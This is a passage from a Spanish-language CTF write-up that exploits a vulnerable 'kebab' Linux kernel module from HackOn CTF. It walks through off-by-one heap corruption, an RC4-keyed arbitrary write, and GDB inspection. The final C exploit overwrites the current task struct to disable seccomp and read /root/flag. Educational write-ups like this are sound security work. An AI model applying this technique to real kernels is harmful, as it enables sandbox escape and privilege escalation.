+<span class="mtk1">  </span><span class="mtk5">for</span><span class="mtk1"> (</span><span class="mtk7 mtki">int</span><span class="mtk1"> i </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">; i </span><span class="mtk5">&lt;</span><span class="mtk1"> </span><span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1">; i</span><span class="mtk5">++</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"</span><span class="mtk6">%02x</span><span class="mtk4">"</span><span class="mtk1">, (</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">char</span><span class="mtk1">) buff[i]);</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">""</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk8">RC4</span><span class="mtk1">(buff, new_arg.buffer, </span><span class="mtk5">sizeof</span><span class="mtk1">(buff));</span>
+
+<span class="mtk1">  </span><span class="mtk3">// Second allocation: set target address for arb-w</span><span class="mtk3">rite</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ((ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">ioctl_new</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">new_arg))) {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[!] Error ioctl_new"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">close</span><span class="mtk1">(fd);</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> ret;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Third allocation =&gt; "</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk8">memset</span><span class="mtk1">(new_arg.buffer, </span><span class="mtk4">'A'</span><span class="mtk1">, </span><span class="mtk5">sizeof</span><span class="mtk1">(buff));</span>
+<span class="mtk1">  new_arg.buffer[</span><span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk8">printf</span><span class="mtk1">(</span><span class="mtk4">"size: </span><span class="mtk6">%ld\n</span><span class="mtk4">key: </span><span class="mtk6">%s\n</span><span class="mtk4">buffer: </span><span class="mtk6">%s\n</span><span class="mtk4">"</span><span class="mtk1">, new_arg.size, new_arg.key, new_arg.buffer);</span>
+
+<span class="mtk1">  </span><span class="mtk3">// Third allocation: dummy</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ((ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">ioctl_new</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">new_arg))) {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[!] Error ioctl_new"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">close</span><span class="mtk1">(fd);</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> ret;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Fourth allocation =&gt; "</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk8">memset</span><span class="mtk1">(buff, </span><span class="mtk4">'B'</span><span class="mtk1">, </span><span class="mtk5">sizeof</span><span class="mtk1">(buff));</span>
+<span class="mtk1">  buff[</span><span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk8">RC4</span><span class="mtk1">(buff, new_arg.buffer, </span><span class="mtk5">sizeof</span><span class="mtk1">(buff));</span>
+
+<span class="mtk1">  </span><span class="mtk3">// Last allocation: arb-write</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ((ret </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">ioctl_new</span><span class="mtk1">(</span><span class="mtk5">&amp;</span><span class="mtk1">new_arg))) {</span>
+<span class="mtk1">    </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"[!] Error ioctl_new"</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk8">close</span><span class="mtk1">(fd);</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1"> ret;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk4">"Finish =&gt; "</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">getchar</span><span class="mtk1">();</span>
+
+<span class="mtk1">  </span><span class="mtk8">close</span><span class="mtk1">(fd);</span>
+
+<span class="mtk1">  </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Con este código, podemos ir mirando GDB paso por paso:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">/home/user # grep kebab /proc/kallsyms
+ffffffffc01f9024 r _note_6      [kebab]
+ffffffffc01f8000 t kebab_open   [kebab]
+ffffffffc01f8010 t ioctl_read   [kebab]
+ffffffffc01faa00 b RC4_key      [kebab]
+ffffffffc01fab40 b n_buffs      [kebab]
+ffffffffc01fab60 b sec_buffs    [kebab]
+ffffffffc01f8240 t kebab_release        [kebab]
+ffffffffc01f8bba t rc4_init.cold        [kebab]
+ffffffffc01f8be0 t RC4.cold     [kebab]
+ffffffffc01f91a8 r __func__.0   [kebab]
+ffffffffc01f91a0 r __func__.1   [kebab]
+ffffffffc01f8490 t ioctl_new    [kebab]
+ffffffffc01f8a90 t kebab_ioctl  [kebab]
+ffffffffc01fab20 b kebab_mutex  [kebab]
+ffffffffc01f8bf8 t kebab_ioctl.cold     [kebab]
+ffffffffc01faa00 b __key.2      [kebab]
+ffffffffc01fa600 d kebab_device [kebab]
+ffffffffc01f8c0c t kebab_exit   [kebab]
+ffffffffc01f91c0 r kebab_fops   [kebab]
+ffffffffc01fa680 d __this_module        [kebab]
+ffffffffc01f8250 t rc4_init     [kebab]
+ffffffffc01f8c0c t cleanup_module       [kebab]
+ffffffffc01f83f0 t RC4  [kebab]
+ffffffffc01f8370 t rc4_crypt    [kebab]
+/home/user # ./exploit
+[*] Opened device
+pid: 125
+cur: 0xffff89c83df8c140
+max_len: 256
+First allocation =>
+
+size: 32
+key: 8pbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
+buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+</code></pre></div><p>Ahora, podemos verificar que hemos sobrescrito el <em>chunk</em> adyacente con <code>0x80</code> al explotar el <em>off-by-one</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/4gx 0xffffffffc0059b60
+<span class="code-dark-blue">0xffffffffc0059b60</span>:     0xffff99fd3df71910      0x0000000000000000  
+<span class="code-dark-blue">0xffffffffc0059b70</span>:     0x0000000000000000      0x0000000000000000
+<span class="code-green">gef&gt; </span>x/2gx 0xffff99fd3df71910
+<span class="code-dark-blue">0xffff99fd3df71910</span>:     0xffff99fd3d61e160      0x0000000000000020
+<span class="code-green">gef&gt; </span>x/12gx 0xffff99fd3d61e160
+<span class="code-dark-blue">0xffff99fd3d61e160</span>:     0x0b47361df040c0b4      0x9028a4e7476d623a
+<span class="code-dark-blue">0xffff99fd3d61e170</span>:     0x0c7e3de44d34c189      0xc3e8867a9362350c
+<span class="code-dark-blue">0xffff99fd3d61e180</span>:     0xffff99fd3d61e180      0xffff99fd3d61e1a0
+<span class="code-dark-blue">0xffff99fd3d61e190</span>:     0xffffffff9e09b4e1      0x0000000000000000
+<span class="code-dark-blue">0xffff99fd3d61e1a0</span>:     0xffff99fd3d61e1c0      0xffff99fd3d61e1c0
+<span class="code-dark-blue">0xffff99fd3d61e1b0</span>:     0xffffffff9e09b48e      0x0000000000000000
+</code></pre></div><p>Y así es. En la siguiente asignación, se debe poner la dirección en la que queremos escribir al final del <em>exploit</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Second allocation =>
+
+40c1f83dc889ffff414141414141414141414141414141414141414141414100  
+</code></pre></div><p>Y aquí lo tenemos, la dirección de <code>current</code> (<code>0xffff89c83df8c140</code>):</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/12gx 0xffff89c83d627160
+<span class="code-dark-blue">0xffff89c83d627160</span>:     0x0b47361df040c0b4      0x9028a4e7476d623a  
+<span class="code-dark-blue">0xffff89c83d627170</span>:     0x0c7e3de44d34c189      0xc3e8867a9362350c
+<span class="code-dark-blue">0xffff89c83d627180</span>:     0xffff89c83df8c140      0x4141414141414141
+<span class="code-dark-blue">0xffff89c83d627190</span>:     0x4141414141414141      0x0041414141414141
+<span class="code-dark-blue">0xffff89c83d6271a0</span>:     0xffff89c83d627180      0xffff89c83d6271c0
+<span class="code-dark-blue">0xffff89c83d6271b0</span>:     0xffffffffb5c9b48e      0x0000000000000000
+</code></pre></div><p>La tercera asignación no contiene información relevante, y en la cuarta asignación estaremos escribiendo sobre <code>current</code> (32 caracteres <code>B</code>). Es por esto por lo que recibimos un <em>panic</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">Third allocation =&gt;
+
+size: 32
+key: 8pbAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
+buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Fourth allocation =&gt;
+
+[   30.318911] general protection fault: 0000 [#1] SMP PTI
+[   30.320131] CPU: 0 PID: 125 Comm: exploit Tainted: G           OE     4.19.1
+[   30.320469] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS rel4
+[   30.321514] RIP: 0010:cpuacct_charge+0x1c/0x60
+[   30.321918] Code: 8e 66 66 2e 0f 1f 84 00 00 00 00 00 66 90 0f 1f 44 00 00 8
+[   30.322905] RSP: 0018:ffff89c83e803da0 EFLAGS: 00000046
+[   30.323159] RAX: 0042424242424242 RBX: ffff89c83df8c1c0 RCX: 000000000000000
+[   30.323524] RDX: 000000004e8ce17e RSI: 00000000003d4daf RDI: ffff89c83df8c10
+[   30.323872] RBP: ffff89c83e803da0 R08: 000000070f1a1948 R09: 000000000000000
+[   30.324145] R10: 0000000000000000 R11: 0000000000000000 R12: ffff89c83d5b080
+[   30.324492] R13: 00000000003d4daf R14: 000000004aa4a868 R15: ffff89c83df8c10
+[   30.324949] FS:  0000000000408cb8(0000) GS:ffff89c83e800000(0000) knlGS:0000
+[   30.325284] CS:  0010 DS: 0000 ES: 0000 CR0: 0000000080050033
+[   30.325499] CR2: 0000000000406000 CR3: 000000003d690000 CR4: 000000000030060
+[   30.326046] Call Trace:
+[   30.326741]  &lt;IRQ&gt;
+[   30.327218]  ? show_regs.cold+0x1a/0x1f
+[   30.327382]  ? __die.cold+0x60/0xa9
+[   30.327576]  ? die+0x30/0x50
+[   30.327733]  ? do_general_protection+0xa2/0x180
+[   30.327986]  ? general_protection+0x1e/0x30
+[   30.328245]  ? cpuacct_charge+0x1c/0x60
+[   30.328482]  update_curr+0xee/0x200
+[   30.328921]  task_tick_fair+0xe1/0x7f0
+[   30.329130]  ? sched_clock+0x9/0x10
+[   30.329297]  scheduler_tick+0x96/0x110
+[   30.329498]  update_process_times+0x43/0x60
+[   30.329748]  tick_sched_handle+0x29/0x60
+[   30.329984]  tick_sched_timer+0x5a/0xd0
+[   30.330191]  __hrtimer_run_queues+0x10d/0x260
+[   30.330433]  ? tick_do_update_jiffies64.part.0+0x110/0x110
+[   30.330794]  hrtimer_interrupt+0xfe/0x2b0
+[   30.331035]  smp_apic_timer_interrupt+0x73/0x140
+[   30.331275]  apic_timer_interrupt+0xf/0x20
+[   30.331765]  &lt;/IRQ&gt;
+[   30.332003] Modules linked in: kebab(OE)
+</code></pre></div><p>Para que esto no ocurra, podemos comenzar a escribir 16 bytes por detrás, y así solo tocamos 16 bytes de la estructura <code>current</code> (que los pondremos a cero para deshabilitar las reglas <code>seccomp</code>).</p><h3 id="_exploit_-final"><em>Exploit</em> final</h3><p>Una vez corregido esto, podemos transformar el <em>exploit</em> de prueba al formato que requiere el reto (librería con una función <code>exploit</code> que recibe como parámetro <code>fd</code>, el descriptor de archivo del <em>device</em>). Además, podemos quitar algunas de las llamadas a <code>puts</code> y <code>printf</code> para que el binario resultante sea más pequeño:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk7 mtki">void</span><span class="mtk1"> </span><span class="mtk8">exploit</span><span class="mtk1">(</span><span class="mtk7 mtki">int</span><span class="mtk1"> </span><span class="mtk9 mtki">fd</span><span class="mtk1">) {</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk1">buff</span><span class="mtk1">[</span><span class="mtk5">0x</span><span class="mtk6">20</span><span class="mtk1">];</span>
+<span class="mtk1">  </span><span class="mtk7 mtki">char</span><span class="mtk1"> </span><span class="mtk1">flag</span><span class="mtk1">[</span><span class="mtk6">256</span><span class="mtk1">];</span>
+<span class="mtk1">  </span><span class="mtk8 mtku">FILE</span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk1">fp</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk8">memset</span><span class="mtk1">(</span><span class="mtk1">RC4_key</span><span class="mtk1">, </span><span class="mtk4">'A'</span><span class="mtk1">, </span><span class="mtk8">MAX_RC4_LEN</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk1">RC4_key</span><span class="mtk1">[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'8'</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk1">RC4_key</span><span class="mtk1">[</span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'p'</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk1">RC4_key</span><span class="mtk1">[</span><span class="mtk6">2</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'b'</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk1">RC4_key</span><span class="mtk1">[</span><span class="mtk6">255</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'</span><span class="mtk6">\0</span><span class="mtk4">'</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">key_info</span><span class="mtk1"> </span><span class="mtk1">ki</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">ioctl_set_key</span><span class="mtk1">(</span><span class="mtk9 mtki">fd</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">ki</span><span class="mtk1">)) {</span>
+<span class="mtk1">    </span><span class="mtk8">close</span><span class="mtk1">(</span><span class="mtk9 mtki">fd</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">memset</span><span class="mtk1">(</span><span class="mtk1">buff</span><span class="mtk1">, </span><span class="mtk4">'A'</span><span class="mtk1">, </span><span class="mtk5">sizeof</span><span class="mtk1">(</span><span class="mtk1">buff</span><span class="mtk1">));</span>
+<span class="mtk1">  </span><span class="mtk1">buff</span><span class="mtk1">[</span><span class="mtk5">sizeof</span><span class="mtk1">(</span><span class="mtk1">buff</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk7 mtki">struct</span><span class="mtk1"> </span><span class="mtk8 mtku">new_secbuff_arg</span><span class="mtk1"> </span><span class="mtk1">new_arg</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> { .</span><span class="mtk1">size</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">sizeof</span><span class="mtk1">(</span><span class="mtk1">buff</span><span class="mtk1">), .</span><span class="mtk1">buffer</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">buff</span><span class="mtk1"> };</span>  
+<span class="mtk1">  </span><span class="mtk8">strncpy</span><span class="mtk1">(</span><span class="mtk1">new_arg</span><span class="mtk1">.</span><span class="mtk1">key</span><span class="mtk1">, </span><span class="mtk1">RC4_key</span><span class="mtk1">, </span><span class="mtk8">MAX_RC4_LEN</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk3">// First allocation: trigger off-by-one</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">ioctl_new</span><span class="mtk1">(</span><span class="mtk9 mtki">fd</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">new_arg</span><span class="mtk1">)) {</span>
+<span class="mtk1">    </span><span class="mtk8">close</span><span class="mtk1">(</span><span class="mtk9 mtki">fd</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  ((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk5">*</span><span class="mtk1">) </span><span class="mtk1">buff</span><span class="mtk1">)[</span><span class="mtk6">0</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> ((</span><span class="mtk7 mtki">unsigned</span><span class="mtk1"> </span><span class="mtk7 mtki">long</span><span class="mtk1">) </span><span class="mtk1">ki</span><span class="mtk1">.</span><span class="mtk1">cur</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">16</span><span class="mtk1">;</span>
+<span class="mtk1">  </span><span class="mtk8">RC4</span><span class="mtk1">(</span><span class="mtk1">buff</span><span class="mtk1">, </span><span class="mtk1">new_arg</span><span class="mtk1">.</span><span class="mtk1">buffer</span><span class="mtk1">, </span><span class="mtk5">sizeof</span><span class="mtk1">(</span><span class="mtk1">buff</span><span class="mtk1">));</span>
+
+<span class="mtk1">  </span><span class="mtk3">// Second allocation: set target address for arb-w</span><span class="mtk3">rite</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">ioctl_new</span><span class="mtk1">(</span><span class="mtk9 mtki">fd</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">new_arg</span><span class="mtk1">)) {</span>
+<span class="mtk1">    </span><span class="mtk8">close</span><span class="mtk1">(</span><span class="mtk9 mtki">fd</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">memset</span><span class="mtk1">(</span><span class="mtk1">new_arg</span><span class="mtk1">.</span><span class="mtk1">buffer</span><span class="mtk1">, </span><span class="mtk4">'A'</span><span class="mtk1">, </span><span class="mtk5">sizeof</span><span class="mtk1">(</span><span class="mtk1">buff</span><span class="mtk1">));</span>
+<span class="mtk1">  </span><span class="mtk1">new_arg</span><span class="mtk1">.</span><span class="mtk1">buffer</span><span class="mtk1">[</span><span class="mtk5">sizeof</span><span class="mtk1">(</span><span class="mtk1">buff</span><span class="mtk1">) </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1">] </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+
+<span class="mtk1">  </span><span class="mtk3">// Third allocation: dummy</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">ioctl_new</span><span class="mtk1">(</span><span class="mtk9 mtki">fd</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">new_arg</span><span class="mtk1">)) {</span>
+<span class="mtk1">    </span><span class="mtk8">close</span><span class="mtk1">(</span><span class="mtk9 mtki">fd</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">memset</span><span class="mtk1">(</span><span class="mtk1">buff</span><span class="mtk1">, </span><span class="mtk6">0</span><span class="mtk1">, </span><span class="mtk5">sizeof</span><span class="mtk1">(</span><span class="mtk1">buff</span><span class="mtk1">));</span>
+<span class="mtk1">  </span><span class="mtk8">RC4</span><span class="mtk1">(</span><span class="mtk1">buff</span><span class="mtk1">, </span><span class="mtk1">new_arg</span><span class="mtk1">.</span><span class="mtk1">buffer</span><span class="mtk1">, </span><span class="mtk5">sizeof</span><span class="mtk1">(</span><span class="mtk1">buff</span><span class="mtk1">));</span>
+
+<span class="mtk1">  </span><span class="mtk3">// Last allocation: arb-write</span>
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> (</span><span class="mtk8">ioctl_new</span><span class="mtk1">(</span><span class="mtk9 mtki">fd</span><span class="mtk1">, </span><span class="mtk5">&amp;</span><span class="mtk1">new_arg</span><span class="mtk1">)) {</span>
+<span class="mtk1">    </span><span class="mtk8">close</span><span class="mtk1">(</span><span class="mtk9 mtki">fd</span><span class="mtk1">);</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">close</span><span class="mtk1">(</span><span class="mtk9 mtki">fd</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk5">if</span><span class="mtk1"> ((</span><span class="mtk1">fp</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">fopen</span><span class="mtk1">(</span><span class="mtk4">"/root/flag"</span><span class="mtk1">, </span><span class="mtk4">"r"</span><span class="mtk1">)) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk8">NULL</span><span class="mtk1">) {</span>
+<span class="mtk1">    </span><span class="mtk5">return</span><span class="mtk1">;</span>
+<span class="mtk1">  }</span>
+
+<span class="mtk1">  </span><span class="mtk8">fgets</span><span class="mtk1">(</span><span class="mtk1">flag</span><span class="mtk1">, </span><span class="mtk5">sizeof</span><span class="mtk1">(</span><span class="mtk1">flag</span><span class="mtk1">), </span><span class="mtk1">fp</span><span class="mtk1">);</span>
+<span class="mtk1">  </span><span class="mtk8">fclose</span><span class="mtk1">(</span><span class="mtk1">fp</span><span class="mtk1">);</span>
+
+<span class="mtk1">  </span><span class="mtk8">puts</span><span class="mtk1">(</span><span class="mtk1">flag</span><span class="mtk1">);</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Como se puede ver, después de utilizar la primitiva de escritura arbitraria sobre la estructura <code>current</code>, ya podemos leer el archivo <code>/root/flag</code>, puesto que el campo que indica si <code>seccomp</code> está activado ha sido sobrescrito a cero.</p><h2 id="_flag_"><em>Flag</em></h2><p>Con este <em>exploit</em> podemos obtener la <em>flag</em>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">  ____         __       ____                     _
+ / ___|  __ _ / _| ___ / ___|_   _  __ _ _ __ __| |
+ \___ \ / _` | |_ / _ \ |  _| | | |/ _` | '__/ _` |
+  ___) | (_| |  _|  __/ |_| | |_| | (_| | | | (_| |
+ |____/ \__,_|_|  \___|\____|\__,_|\__,_|_|  \__,_|
+
+----------------------------------------------------  
+[+]            By DiegoAltF4 and Dbd4            [+]
+----------------------------------------------------
+
+/home/user $ /chall/run
+flag{fake_flag}
+</code></pre></div><p>El <em>exploit</em> completo se puede encontrar aquí: <a href="https://github.com/7Rocky/CTF-scripts/tree/main/HackOn%20CTF/Kerbab/exploit.c"><code>exploit.c</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contenidos</p><nav id="TableOfContents"><ul><li><a href="#análisis-del-código-fuente">Análisis del código fuente</a><ul><li><a href="#función-inicial">Función inicial</a></li><li><a href="#función-de-asignación">Función de asignación</a></li><li><a href="#cifrado-rc4">Cifrado RC4</a></li><li><a href="#función-de-lectura">Función de lectura</a></li></ul></li><li><a href="#configuración-del-entorno">Configuración del entorno</a><ul><li><a href="#peculiaridades">Peculiaridades</a></li></ul></li><li><a href="#solución-no-intencionada">Solución no intencionada</a></li><li><a href="#estrategia-de-explotación">Estrategia de explotación</a></li><li><a href="#desarrollo-del-_exploit_">Desarrollo del <em>exploit</em></a><ul><li><a href="#primeras-pruebas">Primeras pruebas</a></li><li><a href="#clave-de-rc4">Clave de RC4</a></li><li><a href="#primitiva-de-escritura-arbitraria">Primitiva de escritura arbitraria</a></li><li><a href="#_exploit_-final"><em>Exploit</em> final</a></li></ul></li><li><a href="#_flag_"><em>Flag</em></a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">🍺 <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Recibe un resumen semanal del blog"></p><input type="hidden" value="1" name="embed">
+<input style="display:none;color:var(--header)" type="submit" value="Suscribirse"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">Ver historial de resúmenes</a></p><p class="tc">impulsado por <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; Blog de 7Rocky. Ciberseguridad y Mates 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn——Opens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg><span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 